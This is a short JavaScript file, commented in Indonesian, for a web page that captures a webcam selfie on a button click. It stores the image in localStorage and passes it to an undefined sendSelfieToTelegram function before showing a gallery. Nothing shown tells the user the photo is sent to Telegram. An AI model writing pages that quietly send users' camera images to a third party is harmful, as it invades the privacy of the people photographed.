// js/selfie.js

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const takeBtn = document.getElementById("takeSelfie");

function startCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
      video.play();
    })
    .catch(err => {
      alert("Kamera tidak bisa diakses 😢");
    });
}

takeBtn.addEventListener("click", () => {
  // Tangkap gambar dari video
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  // Stop kamera
  const tracks = video.srcObject.getTracks();
  tracks.forEach(track => track.stop());

  // Ambil data URL gambar
  const selfieData = canvas.toDataURL("image/png");
  localStorage.setItem("selfie", selfieData);

  // Sembunyikan modal kamera
  document.getElementById("modalSelfie").style.display = "none";

  // Kirim ke Telegram
  sendSelfieToTelegram(selfieData);

  // Lanjut ke galeri
  showGallerySlide();
});
